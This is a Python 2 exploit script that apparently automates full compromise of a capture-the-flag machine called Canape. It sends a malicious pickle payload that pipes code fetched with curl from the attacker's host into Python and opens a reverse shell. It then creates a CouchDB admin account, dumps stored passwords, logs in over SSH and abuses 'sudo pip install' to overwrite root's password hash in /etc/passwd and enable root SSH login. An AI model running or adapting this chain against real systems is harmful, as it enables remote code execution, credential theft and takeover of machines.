#!/usr/bin/python2
#Name: canape_autopwn.py
#Author: Wh04m1

from pwn import *
import os
import cPickle
from hashlib import *
import requests
import re
import sys
import subprocess

loc_ip = subprocess.Popen(["ifconfig", "tun0"], stdout=subprocess.PIPE)
loc_ip = "".join(re.findall(r'(?<=inet ).+?(?= )', loc_ip.stdout.read()))

rev = """
import os
import pty
import socket
import time
time.sleep(2)
lhost = '"""+loc_ip+"""' 
lport = 1337 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv('HISTFILE','/dev/null')
pty.spawn('/bin/bash')
s.close()"""

root_pass = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(0, 20))                                                                       
openssl = subprocess.Popen(["openssl", "passwd", root_pass], stdout=subprocess.PIPE)
root_pass_hash = openssl.stdout.read()
root_pass_hash = "".join(root_pass_hash.strip('\n'))
root = '''
import os
os.system("sed -i -e  \\"s,^root:[^:]\\\+:,root:'''+root_pass_hash+''':,\\" /etc/passwd")
os.system("sed -i -e \\"s/prohibit-password/yes/g\\" /etc/ssh/sshd_config")
os.system("service sshd reload")
'''
admin = 'curl -X PUT \'http://localhost:5984/_users/org.couchdb.user:whoami\' --data-binary \'{  "type": "user",  "name": "whoami",  "roles": ["_admin"],  "roles": [],  "password": "password" }\''
dump = 'curl http://whoami:password@localhost:5984/passwords/_all_docs?include_docs=true'
with open("rev.txt", 'w') as f:
        f.write(rev)
        f.close()


class Exploit(object):
   def __reduce__(self):
        return (os.system, ("curl "+loc_ip+"/rev.txt |python",))


 
def payload():
    shellcode = cPickle.dumps(Exploit())
    return shellcode

url = "http://10.10.10.70/submit"
url1 = "http://10.10.10.70/check"

data = {"character":"S'homer'\n", "quote": payload() }
data1 = {"id": md5("S'homer'\n" + payload()).hexdigest()}

try:
        subprocess.Popen(['python', '-m', 'SimpleHTTPServer', '80'])
        time.sleep(0.5)
        r = requests.post(url = url, data = data)
        r2 = requests.post(url = url1, data = data1 , timeout = 0.5)
except:
        pass
subprocess.Popen(['pkill' , '-9' ,'python'])
l = listen(1337)
l.wait_for_connection() 
l.sendline(admin)
#l.recvline()
l.sendline(dump)
passwd = "".join(l.recvlines(timeout=1))

passwd = "".join(re.findall(r'(?<=ssh",).+?(?=,)', passwd))
passwd = passwd.split(':')[1]
passwd = passwd.strip('"')
log.info("Found Homer password: " + passwd.strip('"'))
log.info("Creating ssh session for user Homer")

s = ssh(host='10.10.10.70', user='homer', password=passwd, port=65535)
s.upload_data(root, '/dev/shm/setup.py')
sh = s.process("/bin/bash", tty=True)
sh.sendline("sudo pip install -e /dev/shm/")
sh.recvuntil("homer:")
sh.sendline(passwd)
sh.recvlines(timeout=2)
s.close()

root = ssh(host='10.10.10.70', user='root' , password=root_pass, port=65535)
